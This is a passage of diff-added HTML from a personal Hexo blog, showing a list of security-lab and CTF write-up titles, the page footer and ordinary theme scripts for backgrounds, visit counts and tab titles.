href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">archlab实验报告：y86命令使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/08/RSA/">RSA解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/">红帽杯2019 easyRe</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">ret2libc学习报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/19/bomblab/">bomblab实验报告:二进制安全与逆向分析</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 xia0ji233
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
